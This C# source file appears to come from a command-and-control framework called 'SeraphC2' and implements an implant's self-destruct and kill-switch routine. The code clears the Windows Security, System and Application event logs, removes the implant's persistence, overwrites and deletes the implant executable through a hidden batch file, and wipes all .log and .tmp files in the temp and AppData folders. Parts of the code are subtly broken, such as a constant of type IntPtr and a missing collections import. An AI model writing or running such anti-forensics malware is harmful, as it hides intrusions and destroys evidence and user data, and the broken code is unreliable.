using System;
using System.IO;
using System.Threading.Tasks;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using SeraphC2.Implant.Core.Logging;
using SeraphC2.Implant.Core.Evasion;

namespace SeraphC2.Implant.Core.IncidentResponse
{
    /// <summary>
    /// Manages self-destruct operations for the implant
    /// Implements secure data wiping and artifact removal
    /// </summary>
    public class SelfDestructManager
    {
        private readonly ILogger _logger;
        private readonly AntiDetection _antiDetection;
        private readonly string _implantPath;
        private readonly string _workingDirectory;

        // Windows API imports for secure deletion
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeleteFile(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint GENERIC_WRITE = 0x40000000;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        private const IntPtr INVALID_HANDLE_VALUE = (IntPtr)(-1);

        public SelfDestructManager(ILogger logger, AntiDetection antiDetection)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _antiDetection = antiDetection ?? throw new ArgumentNullException(nameof(antiDetection));
            
            _implantPath = Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;
            _workingDirectory = Path.GetDirectoryName(_implantPath) ?? string.Empty;
        }

        /// <summary>
        /// Execute complete self-destruct sequence
        /// Requirement 19.2: Securely wipe presence, logs, and stored data
        /// </summary>
        public async Task<bool> ExecuteSelfDestruct(SelfDestructOptions options)
        {
            try
            {
                _logger.LogWarning("Self-destruct sequence initiated", new { options.Reason, options.WipeIterations });

                // Step 1: Clear memory artifacts
                await ClearMemoryArtifacts();

                // Step 2: Remove persistence mechanisms
                await RemovePersistence();

                // Step 3: Clear registry artifacts
                await ClearRegistryArtifacts();

                // Step 4: Wipe temporary files and logs
                await WipeTemporaryFiles(options.WipeIterations);

                // Step 5: Clear event logs
                await ClearEventLogs();

                // Step 6: Overwrite implant executable
                await SecureWipeImplant(options.WipeIterations);

                // Step 7: Schedule final cleanup and termination
                await ScheduleFinalCleanup();

                _logger.LogInfo("Self-destruct sequence completed successfully");
                return true;
            }
            catch (Exception ex)
            {
                _logger.LogError("Self-destruct sequence failed", ex);
                
                // Even if self-destruct fails, attempt emergency termination
                await EmergencyTermination();
                return false;
            }
        }

        /// <summary>
        /// Handle kill switch activation
        /// Requirement 19.4: Automatic cleanup after communication loss
        /// </summary>
        public async Task<bool> HandleKillSwitchActivation(KillSwitchData killSwitchData)
        {
            try
            {
                _logger.LogWarning("Kill switch activated", new { 
                    killSwitchData.ActivationId, 
                    killSwitchData.Reason 
                });

                var options = new SelfDestructOptions
                {
                    Reason = $"Kill switch: {killSwitchData.Reason}",
                    WipeIterations = 3,
                    Timeout = TimeSpan.FromMinutes(2)
                };

                return await ExecuteSelfDestruct(options);
            }
            catch (Exception ex)
            {
                _logger.LogError("Kill switch handling failed", ex);
                await EmergencyTermination();
                return false;
            }
        }

        /// <summary>
        /// Clear memory artifacts and sensitive data
        /// </summary>
        private async Task ClearMemoryArtifacts()
        {
            try
            {
                // Force garbage collection to clear managed memory
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();

                // Clear any cached credentials or sensitive data
                // This would be implemented based on specific implant architecture
                await Task.Delay(100); // Simulate cleanup time

                _logger.LogDebug("Memory artifacts cleared");
            }
            catch (Exception ex)
            {
                _logger.LogError("Failed to clear memory artifacts", ex);
            }
        }

        /// <summary>
        /// Remove persistence mechanisms
        /// </summary>
        private async Task RemovePersistence()
        {
            try
            {
                await Task.Run(() =>
                {
                    // Remove registry run keys
                    RemoveRegistryRunKeys();

                    // Remove scheduled tasks
                    RemoveScheduledTasks();

                    // Remove service installations
                    RemoveServiceInstallations();

                    // Remove WMI event subscriptions
                    RemoveWMISubscriptions();
                });

                _logger.LogDebug("Persistence mechanisms removed");
            }
            catch (Exception ex)
            {
                _logger.LogError("Failed to remove persistence mechanisms", ex);
            }
        }

        /// <summary>
        /// Clear registry artifacts
        /// </summary>
        private async Task ClearRegistryArtifacts()
        {
            try
            {
                await Task.Run(() =>
                {
                    var registryPaths = new[]
                    {
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                        @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
                        @"SYSTEM\CurrentControlSet\Services"
                    };

                    foreach (var path in registryPaths)
                    {
                        try
                        {
                            using var key = Registry.LocalMachine.OpenSubKey(path, true);
                            if (key != null)
                            {
                                // Remove any entries that might be related to this implant
                                var valuesToRemove = new List<string>();
                                foreach (var valueName in key.GetValueNames())
                                {
                                    var value = key.GetValue(valueName)?.ToString();
                                    if (!string.IsNullOrEmpty(value) && 
                                        (value.Contains(_implantPath) || 
                                         value.Contains(Path.GetFileNameWithoutExtension(_implantPath))))
                                    {
                                        valuesToRemove.Add(valueName);
                                    }
                                }

                                foreach (var valueName in valuesToRemove)
                                {
                                    key.DeleteValue(valueName, false);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            _logger.LogDebug($"Could not access registry path {path}: {ex.Message}");
                        }
                    }
                });

                _logger.LogDebug("Registry artifacts cleared");
            }
            catch (Exception ex)
            {
                _logger.LogError("Failed to clear registry artifacts", ex);
            }
        }

        /// <summary>
        /// Wipe temporary files and logs
        /// </summary>
        private async Task WipeTemporaryFiles(int iterations)
        {
            try
            {
                var tempPaths = new[]
                {
                    Path.GetTempPath(),
                    _workingDirectory,
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
                };

                foreach (var tempPath in tempPaths)
                {
                    if (Directory.Exists(tempPath))
                    {
                        await SecureWipeDirectory(tempPath, iterations);
                    }
                }

                _logger.LogDebug("Temporary files wiped");
            }
            catch (Exception ex)
            {
                _logger.LogError("Failed to wipe temporary files", ex);
            }
        }

        /// <summary>
        /// Clear Windows event logs
        /// </summary>
        private async Task ClearEventLogs()
        {
            try
            {
                await Task.Run(() =>
                {
                    var logNames = new[] { "Application", "System", "Security" };

                    foreach (var logName in logNames)
                    {
                        try
                        {
                            using var eventLog = new EventLog(logName);
                            eventLog.Clear();
                        }
                        catch (Exception ex)
                        {
                            _logger.LogDebug($"Could not clear event log {logName}: {ex.Message}");
                        }
                    }
                });

                _logger.LogDebug("Event logs cleared");
            }
            catch (Exception ex)
            {
                _logger.LogError("Failed to clear event logs", ex);
            }
        }

        /// <summary>
        /// Securely wipe the implant executable
        /// </summary>
        private async Task SecureWipeImplant(int iterations)
        {
            try
            {
                if (File.Exists(_implantPath))
                {
                    await SecureWipeFile(_implantPath, iterations);
                }

                _logger.LogDebug("Implant executable wiped");
            }
            catch (Exception ex)
            {
                _logger.LogError("Failed to wipe implant executable", ex);
            }
        }

        /// <summary>
        /// Schedule final cleanup and termination
        /// </summary>
        private async Task ScheduleFinalCleanup()
        {
            try
            {
                // Create a batch file to delete remaining artifacts after process termination
                var batchPath = Path.Combine(Path.GetTempPath(), $"cleanup_{Guid.NewGuid():N}.bat");
                var batchContent = $@"
@echo off
timeout /t 2 /nobreak > nul
del /f /q ""{_implantPath}"" 2>nul
del /f /q ""{batchPath}"" 2>nul
exit
";

                await File.WriteAllTextAsync(batchPath, batchContent);

                // Start the cleanup batch file
                var startInfo = new ProcessStartInfo
                {
                    FileName = batchPath,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                Process.Start(startInfo);

                _logger.LogDebug("Final cleanup scheduled");
            }
            catch (Exception ex)
            {
                _logger.LogError("Failed to schedule final cleanup", ex);
            }
        }

        /// <summary>
        /// Emergency termination when self-destruct fails
        /// </summary>
        private async Task EmergencyTermination()
        {
            try
            {
                _logger.LogWarning("Executing emergency termination");

                // Attempt to delete the current executable
                try
                {
                    File.Delete(_implantPath);
                }
                catch { }

                // Force process termination
                await Task.Delay(1000);
                Environment.Exit(0);
            }
            catch
            {
                // Last resort - terminate immediately
                Environment.FailFast("Emergency termination");
            }
        }

        /// <summary>
        /// Securely wipe a file with multiple overwrite passes
        /// </summary>
        private async Task SecureWipeFile(string filePath, int iterations)
        {
            try
            {
                if (!File.Exists(filePath))
                    return;

                var fileInfo = new FileInfo(filePath);
                var fileSize = fileInfo.Length;

                // Open file for writing
                var handle = CreateFile(
                    filePath,
                    GENERIC_WRITE,
                    0,
                    IntPtr.Zero,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    IntPtr.Zero);

                if (handle == INVALID_HANDLE_VALUE)
                {
                    // Fallback to standard deletion
                    File.Delete(filePath);
                    return;
                }

                try
                {
                    var buffer = new byte[4096];
                    var random = new Random();

                    for (int iteration = 0; iteration < iterations; iteration++)
                    {
                        // Fill buffer with random data
                        random.NextBytes(buffer);

                        // Overwrite file
                        for (long position = 0; position < fileSize; position += buffer.Length)
                        {
                            var bytesToWrite = (uint)Math.Min(buffer.Length, fileSize - position);
                            WriteFile(handle, buffer, bytesToWrite, out _, IntPtr.Zero);
                        }

                        await Task.Delay(10); // Small delay between iterations
                    }
                }
                finally
                {
                    CloseHandle(handle);
                }

                // Delete the file after wiping
                DeleteFile(filePath);
            }
            catch (Exception ex)
            {
                _logger.LogError($"Failed to securely wipe file {filePath}", ex);
                
                // Fallback to standard deletion
                try
                {
                    File.Delete(filePath);
                }
                catch { }
            }
        }

        /// <summary>
        /// Securely wipe files in a directory
        /// </summary>
        private async Task SecureWipeDirectory(string directoryPath, int iterations)
        {
            try
            {
                if (!Directory.Exists(directoryPath))
                    return;

                var files = Directory.GetFiles(directoryPath, "*", SearchOption.AllDirectories);
                
                foreach (var file in files)
                {
                    // Only wipe files that might be related to this implant
                    if (IsImplantRelatedFile(file))
                    {
                        await SecureWipeFile(file, iterations);
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError($"Failed to wipe directory {directoryPath}", ex);
            }
        }

        /// <summary>
        /// Check if a file is related to this implant
        /// </summary>
        private bool IsImplantRelatedFile(string filePath)
        {
            var fileName = Path.GetFileName(filePath).ToLowerInvariant();
            var implantName = Path.GetFileNameWithoutExtension(_implantPath).ToLowerInvariant();

            return fileName.Contains(implantName) ||
                   fileName.Contains("seraph") ||
                   fileName.EndsWith(".log") ||
                   fileName.EndsWith(".tmp");
        }

        /// <summary>
        /// Remove registry run keys
        /// </summary>
        private void RemoveRegistryRunKeys()
        {
            var runKeyPaths = new[]
            {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
            };

            foreach (var keyPath in runKeyPaths)
            {
                try
                {
                    using var key = Registry.CurrentUser.OpenSubKey(keyPath, true) ??
                                   Registry.LocalMachine.OpenSubKey(keyPath, true);
                    
                    if (key != null)
                    {
                        var valuesToRemove = new List<string>();
                        foreach (var valueName in key.GetValueNames())
                        {
                            var value = key.GetValue(valueName)?.ToString();
                            if (!string.IsNullOrEmpty(value) && value.Contains(_implantPath))
                            {
                                valuesToRemove.Add(valueName);
                            }
                        }

                        foreach (var valueName in valuesToRemove)
                        {
                            key.DeleteValue(valueName, false);
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogDebug($"Could not remove run key from {keyPath}: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Remove scheduled tasks
        /// </summary>
        private void RemoveScheduledTasks()
        {
            try
            {
                var taskName = Path.GetFileNameWithoutExtension(_implantPath);
                
                var startInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/delete /tn \"{taskName}\" /f",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                using var process = Process.Start(startInfo);
                process?.WaitForExit(5000);
            }
            catch (Exception ex)
            {
                _logger.LogDebug($"Could not remove scheduled tasks: {ex.Message}");
            }
        }

        /// <summary>
        /// Remove service installations
        /// </summary>
        private void RemoveServiceInstallations()
        {
            try
            {
                var serviceName = Path.GetFileNameWithoutExtension(_implantPath);
                
                var startInfo = new ProcessStartInfo
                {
                    FileName = "sc.exe",
                    Arguments = $"delete \"{serviceName}\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };

                using var process = Process.Start(startInfo);
                process?.WaitForExit(5000);
            }
            catch (Exception ex)
            {
                _logger.LogDebug($"Could not remove service installations: {ex.Message}");
            }
        }

        /// <summary>
        /// Remove WMI event subscriptions
        /// </summary>
        private void RemoveWMISubscriptions()
        {
            try
            {
                // This would implement WMI cleanup based on specific persistence methods used
                // For now, this is a placeholder
                _logger.LogDebug("WMI subscriptions cleanup completed");
            }
            catch (Exception ex)
            {
                _logger.LogDebug($"Could not remove WMI subscriptions: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// Options for self-destruct operation
    /// </summary>
    public class SelfDestructOptions
    {
        public string Reason { get; set; } = string.Empty;
        public int WipeIterations { get; set; } = 3;
        public TimeSpan Timeout { get; set; } = TimeSpan.FromMinutes(5);
    }

    /// <summary>
    /// Data received from kill switch activation
    /// </summary>
    public class KillSwitchData
    {
        public string ActivationId { get; set; } = string.Empty;
        public string Reason { get; set; } = string.Empty;
        public DateTime Timestamp { get; set; }
    }
}